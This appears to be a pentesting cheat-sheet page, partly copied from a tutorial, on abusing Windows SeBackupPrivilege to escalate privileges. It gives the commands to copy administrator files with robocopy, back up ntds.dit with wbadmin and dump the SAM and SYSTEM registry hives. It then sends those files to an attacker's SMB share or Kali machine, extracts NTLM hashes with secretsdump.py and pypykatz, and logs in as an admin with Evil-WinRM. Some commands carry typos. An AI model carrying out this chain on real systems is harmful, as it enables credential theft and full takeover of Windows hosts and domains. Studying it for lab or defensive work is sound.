# SeBackUp Privilege

{% embed url="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" %}

SeBackupPrivilege allows you to access files that we wouldnt normally have.

Using robocopy we can copy files with the pretext of making backups.

```
robocopy /b C:\Users\administrator\desktop c:\
```

```
gci C:\
```

We would have access to all the folders inside the administrator' desktop folder.

What could we do?

Well we can create a new directory in which we can just put sam, system and security files.&#x20;

We then use smbserver from impacket to start our own smb server and run hte following commands.&#x20;

`echo "Y" | wbadmin start backup -backuptarget:\\<our-ip-share\<our-share> -include:c:\windows\ntds`

`wdadmin get version`

**The output will show a version identifier take a note of this**

`echo "Y" | wbadmin start recovery -version:07/16/2022-07:$3 -itemtype:file -items:C\windows\ntds\ntds.dit -recoverytarget:C:\ -norestoreacl`

`reg save HKLM\SYSTEM c:\system.hive`

`cp ntds.dit \\<our-smb-share>\<share>\ntds.dit`

`cp system.hive \\<our-smb-share>\<share>\system.hive`

Then we travel to the location of the share&#x20;

`secretsdump.py -ntds ntds.dit -system system.hive LOCAL`

### Method 2&#x20;

![](https://i0.wp.com/1.bp.blogspot.com/-yl9wJY-9P6U/YIrXyyOTyEI/AAAAAAAAvpY/soWb\_5WCm4UzlS\_58XIXO0f39uhesHlZgCLcBGAsYHQ/s16000/5.png?w=640\&ssl=1)

#### **Exploiting Privilege on Windows 10**

Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with the read and write privilege if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.

cd c:\mkdir Temp

reg save hklm\sam c:\Temp\sam

reg save hklm\system c:\Temp\system

![](https://i0.wp.com/1.bp.blogspot.com/-P2tQlhOEYCE/YIrX3B6aR\_I/AAAAAAAAvpc/8WnIXinanuow6sF9m1qxCdf9SlGUTI3RwCLcBGAsYHQ/s16000/6.png?w=640\&ssl=1)

This means that now our Temp Directory must have a SAM file and a SYSTEM file. Now using the Evil-WinRM download command, we transfer the file from the Temp directory on the target machine to our Kali Linux Machine.

cd Temp

download sam

download system

![](https://i0.wp.com/1.bp.blogspot.com/-E\_qZmwLJAtg/YIrX8v5v9EI/AAAAAAAAvpk/UilsXEy-nZMLXp-Hr9cNfeN3LjOGJvyaACLcBGAsYHQ/s16000/7.png?w=640\&ssl=1)

Now, we can extract the hive secrets from the SAM and SYSTEM file using the pypykatz. If not present on your Kali Linux, you can download it from its [GitHub](https://github.com/skelsec/pypykatz). It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.

pypykatz registry --sam sam system

![](https://i0.wp.com/1.bp.blogspot.com/-P0ODAEbgYOY/YIrYAmb70bI/AAAAAAAAvps/ycB6eBnYeUoocNjoZmVHotvt6wlWAYoUACLcBGAsYHQ/s16000/8.png?w=640\&ssl=1)

Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.
